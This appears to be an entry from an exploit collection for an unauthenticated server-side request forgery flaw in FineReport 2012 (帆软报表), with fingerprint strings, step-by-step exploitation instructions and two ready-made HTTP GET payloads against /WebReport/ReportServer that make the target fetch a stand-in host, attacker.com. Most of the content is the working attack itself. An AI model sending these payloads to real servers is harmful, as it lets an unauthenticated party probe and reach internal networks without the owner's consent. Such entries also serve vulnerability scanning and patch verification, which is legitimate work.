---
id: FINEREPORT-SSRF
title: 帆软FineReport SSRF 漏洞
product: finereport
vendor: 帆软软件
version_affected: "2012"
severity: HIGH
tags: [ssrf, 无需认证, 国产]
fingerprint: ["FineReport", "帆软", "ReportServer"]
---

## 漏洞描述

帆软报表 2012 版本存在 SSRF 漏洞，可探测内网服务或访问内部资源。

## 影响版本

- 2012

## 前置条件

- 无需登录认证
- 目标运行帆软报表 2012 版本，存在 `/WebReport/ReportServer` 接口

## 利用步骤

1. 访问目标 `/WebReport/ReportServer` 确认帆软报表服务存在
2. 在攻击机上启动 HTTP 监听（如 `python -m http.server`）
3. 通过 `op=resource` 或 `op=fr_server` 接口携带攻击机 URL 发起请求，触发服务端请求
4. 在攻击机上确认收到来自目标的 HTTP 请求，验证 SSRF 存在

## Payload

```http
GET /WebReport/ReportServer?op=resource&resource=com.fr.web.controller.ReportServerAction&type=plugin&cmd=test&url=http://attacker.com/ HTTP/1.1
Host: target
```

```http
GET /WebReport/ReportServer?op=fr_server&cmd=sc_visitstatehtml&serverID=http://attacker.com/ HTTP/1.1
Host: target
```

## 验证方法

attacker.com 收到 HTTP 请求即确认 SSRF 存在。
